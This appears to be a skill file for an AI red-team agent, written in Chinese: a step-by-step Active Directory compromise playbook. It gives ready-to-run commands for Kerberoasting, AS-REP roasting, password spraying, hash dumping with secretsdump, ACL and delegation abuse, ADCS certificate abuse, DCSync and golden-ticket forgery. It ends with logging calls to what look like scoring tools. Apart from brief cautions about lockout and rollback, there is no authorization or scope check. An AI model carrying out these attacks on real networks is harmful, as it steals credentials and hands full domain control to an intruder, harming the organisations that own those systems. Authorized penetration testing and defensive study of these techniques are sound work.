---
name: ad-attack
description: 域渗透（AD）全链：BloodHound 拓图、Kerberoast 与 AS-REP、ACL 与委派滥用、ADCS 证书模板（ESC1-8）、DCSync 与票据、横向到域控
whenToUse: 内网 88/389/445 齐开、确认有域环境，且已拿到任意域内低权凭据时
role: internal
enabled: true
---

# 域渗透（先拓图，再挑最短路径）

## 0. 前置
已控一台域内主机（`fscan-intranet` / `gogo-intranet` 的成果）或一个域账号。三件套：`bloodhound-python -u user -p pass -d DOMAIN -ns DC_IP -c All`、`ldapsearch`、`nxc`（NetExec）。

## 1. 凭证收割（低权 → 高权）
| 手法 | 命令要点 | 命中判据 |
| --- | --- | --- |
| Kerberoast | `GetUserSPNs.py DOMAIN/user:pass -dc-ip DC -request` | 拿到 `$krb5tgs$` |
| AS-REP Roast | `GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass` | `$krb5asrep$`（免预认证账号） |
| 密码喷洒 | `nxc smb DC -u users.txt -p 'Summer2026' --continue-on-success` | 先 `--pass-pol` 看锁定策略 |
| 本地凭据 | `secretsdump.py -sam -security -system` | 本地 admin 哈希复用 |

## 2. "非漏洞"提权路径（最常被漏）
- **ACL 滥用**：BloodHound 里 `GenericAll / WriteDACL / ForceChangePassword / AddMember` 指向高权组 → 直接改。
- **委派**：Unconstrained（拿到主机即拿 TGT）、Constrained（S4U2Self+Proxy）、RBCD（写 `msDS-AllowedToActOnBehalfOfOtherIdentity`）。
- **ADCS**：`certipy find -u user@domain -p pass -dc-ip DC -vulnerable` → ESC1（可指定 SAN）、ESC8（HTTP 中继到 `/certsrv`）；拿证书后 `certipy auth -pfx x.pfx` 换 TGT。
- **GPO**：对 OU 有 `WriteGPLink` → 下发计划任务/启动脚本。

## 3. 拿到域控
`secretsdump.py DOMAIN/admin@DC -just-dc-ntlm`（需复制目录更改权限）→ krbtgt 哈希 → 黄金票据（`ticketer.py`）。
验证：`nxc smb DC -u administrator -H <hash>` 回 `Pwn3d!` 才算成功。

## 4. 落库
每台主机/账号 → `redteam_asset_add`（surface 写 `domain` / `dc` / `admin`）；提权路径 → `redteam_vuln_add`（evidence 写 BloodHound 边 + 命令回显）；域控权限 → `redteam_score_hit`；截图 `redteam_shot_add`。

## 5. 纪律
先看锁定策略再喷洒；`kerbrute` 枚举用户用低速率；改 ACL/委派前记下原值以便回滚。
